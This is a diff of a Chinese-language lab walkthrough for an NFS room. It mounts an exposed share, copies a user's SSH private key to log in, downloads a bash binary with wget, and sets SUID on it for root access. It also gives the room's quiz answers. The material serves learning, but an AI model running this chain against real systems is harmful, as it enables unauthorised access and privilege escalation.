@@ -144,7 +144,7 @@ Question 1、2：對靶機執行`nmap`掃描
   <img src="/rooms/images/12_02.png" width="600">
 </p>
 
-Question 3：用`showmoung`，列出靶機的NFS共享
+Question 3：用`showmount`，列出靶機的NFS共享
 
 - NFS共享名稱為：/home
 
@@ -152,9 +152,168 @@ Question 3：用`showmoung`，列出靶機的NFS共享
   <img src="/rooms/images/12_03.png" width="600">
 </p>
 
-Question 4：
+Question 4-7：於虛擬機上創建一個掛載點，使用`mount`掛載遠程主機的 NFS，再查看 NFS 共享內容
+
+- NFS共享中的文件夾名稱為：cappucino 
+- 保存SSH密鑰文件的文件夾是：.ssh文件夾
+- 最有用的SSH密鑰文件是：id_rsa （ssh私鑰文件）
+
+```
+mkdir /tmp/mount
+mount -t nfs <IP>:home /tmp/mount/ -nolock
+cd /tmp/mount
+ls
+cd cappucino
+ls -a
+cd .ssh
+ls
+```
+
+<p align="left">
+  <img src="/rooms/images/12_04.png" width="600">
+</p>
+
+Question 8：複製公鑰、私鑰到虛擬機上，讀取公鑰檔案，並變更私鑰權限。<br>
+以 ssh 私鑰登入 nfs 服務
+
+```
+cp id_rsa* ~/.ssh
+cd ~/.ssh
+ls -a
+cat id_rsa.pub
+chmod 600 id_rsa
+ssh -i id_rsa cappucino@10.10.20.187
+```
+<p align="left">
+  <img src="/rooms/images/12_05.png" width="600">
+</p>
+
+<p align="left">
+  <img src="/rooms/images/12_06.png" width="600">
+</p>
+
+##### 🔐 答題：
+1. How many ports are open on the target machine?
+   
+   目標計算機上打開了多少個埠？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `7`
+
+2. Which port contains the service we're looking to enumerate?
+   
+   哪個埠包含我們要列舉的服務？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `2049`
+
+3. Now, use /usr/sbin/showmount -e [IP] to list the NFS shares, what is the name of the visible share?
+   
+   現在，使用 /usr/sbin/showmount -e [IP] 列出 NFS 共用，可見共用的名稱是什麼？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `/home`
+
+4. Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside?
+   
+   然後，使用我們之前分解的 mount 命令將 NFS 共用掛載到您的本地電腦。將目錄更改為掛載共用的位置 - 其中的資料夾名稱是什麼？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `cappucino`
+
+6. Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server?
+   
+   有趣！現在讓我們做一些研究，看看這些資料夾。這些摺疊者中的哪些可以控制密鑰 ，使我們能夠遠端訪問伺服器？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `.ssh`
+
+7. Which of these keys is most useful to us?
+   
+   這些鑰中哪一個對我們最有用？
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `id_rsa`
+
+8. Can we log into the machine using ssh -i <key-file> <username>@<ip> ? (Y/N)
+   
+   我們可以使用 ssh -i <key-file> <username>@<ip> 登錄計算機嗎？（是/否）
+   
+&nbsp;&nbsp;&nbsp;&nbsp; `Y`
 
 >> #### Task 4：利用 NFS
+
+**NFS 提權**
+
+- Root Squash 是什麼？
+    - Root Squash：NFS 預設開啟，防止遠端使用者以 root 權限操作。
+    - 被套用 Root Squash 時，遠端 root 使用者會被降為 nfsnobody 低權限帳號。<br>
+
+✅ **如果 Root Squash 關閉** ➔ 可以利用上傳檔案設置 SUID 位元進行提權！
+
+---
+
+- SUID 是什麼？
+  - SUID (Set User ID)：讓執行檔以檔案擁有者的**權限執行**。
+  - 如果 SUID 設在 root 擁有的檔案上，普通用戶執行時可直接取得 root 權限。
+
+---
+
+- 📌      攻擊流程（提權步驟）
+1. 取得 低權限 shell。
+2. 上傳自己的 bash 可執行檔到 NFS 分享目錄。
+3. 設定該 bash 檔案的 SUID 權限。
+4. 通過 SSH 登入目標機器。
+5. 執行剛剛上傳的 SUID bash ➔ 取得 root 權限！
+
+✅ Bash 可執行檔來源
+- 指令範例（用 SCP 抓 bash）：<br>
+`scp -i [私鑰檔] [使用者名稱]@[目標IP]:/bin/bash ~/Downloads/bash`
+- 或從網路下載相容版本的 Ubuntu bash（需注意不要下載錯誤版本）。
+
+---
+
+Question 3、4：從 Github 下載 bash 到虛擬機（如為免費AttackBox，無法下載）
+`wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash`
+
+<p align="left">
+  <img src="/rooms/images/12_07.png" width="600">
+</p>
+
+```
+ls -a
+chown root bash
+chmod +x bash
+cp bash /tmp/mount/cappucino/
+chmod +s /tmp/mount/cappucino/bash
+ssh -i id_rsa cappucino@10.10.20.187
+```
+
+下載完成後：
+
+- `ls -a` <br>列出目前目錄所有檔案（確認 bash 是否存在）
+
+
+- `chown root bash` <br>將 bash 的擁有者改為 root（讓 SUID 能以 root 身份執行）
+
+
+- `chmod +x bash` <br>賦予執行權限
+
+
+- `cp bash /tmp/mount/cappucino/`<br>將 bash 複製到 NFS 掛載目錄（目標機可存取）
+
+
+- `chmod +s /tmp/mount/cappucino/bash` <br>開啟 SUID bit，讓任何人執行時以 root 身份執行
+
+
+- `ssh -i id_rsa cappucino@1<IP>` <br>以 SSH 登入目標機器（低權限帳號）
+
+<p align="left">
+  <img src="/rooms/images/12_08.png" width="600">
+</p>
+
+```
+ls -la
+./bash -p
+```
+
+<p align="left">
+  <img src="/rooms/images/12_09.png" width="600">
+</p>
 
 >> #### Task 5：瞭解 SMTP
 
